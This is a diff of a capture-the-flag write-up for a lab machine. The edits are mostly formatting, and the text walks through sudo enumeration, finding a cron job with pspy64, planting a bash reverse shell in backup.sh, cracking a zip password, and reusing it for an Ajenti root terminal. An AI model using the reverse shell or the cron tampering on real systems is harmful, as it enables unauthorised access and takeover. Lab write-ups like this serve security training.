@@ -38,7 +38,7 @@ We can write a script to login as employees and run the command __sudo -l__ and 
 
 After running the script for sometime we get that employee64 can run sudo commands as user programmer.
 
-Logging in as him still we can't find anything significant in all his directories. So we download pspy64 onto the server and run that to see if there are any cronjobs running in the background. 
+Logging in as him still we can't find anything significant in all his directories. So we download __pspy64__ onto the server and run that to see if there are any cronjobs running in the background. 
 
 We see that there is a script running in the background in programmer dir. So we need to login as him to access it to change it.
 
@@ -57,7 +57,7 @@ __bash -i >& /dev/tcp/host_ip/port 0>&1__ --> added in backup.sh
 
 Note: we can't use nano because it's not on this machine we have to use vim editor.
 
-# After we get a shell we got the first flag in local.txt.
+___After we get a shell we got the first flag in local.txt.___
 
 We can run python2 on this so let's start a http server and download the secret.zip file onto our system.
 
@@ -65,14 +65,14 @@ __python -m SimpleHTTPServer 4445__ --> Port number can be anything that's not a
 
 After downloading the file we can [crack the password using john the ripper](https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html).
 
-We find that password to zip file is ___81237900___. Opening that we get a very secure password in Mypassword.txt file.
+We find that __password to zip file is 81237900__. Opening that we get a very secure password in Mypassword.txt file.
 
 This might be the password for that ajenti login running on port 8000. And yes, it is.
 
-___root: contents of Mypasswords.txt___
+__root: contents of Mypasswords.txt__
 
 Now here on the website we see a tab saying terminal. Going to it we see we have a root terminal shell.
 
-# We can change into the root directory and read the proof.txt
+___We can change into the root directory and read the proof.txt___
 
 And That's it.
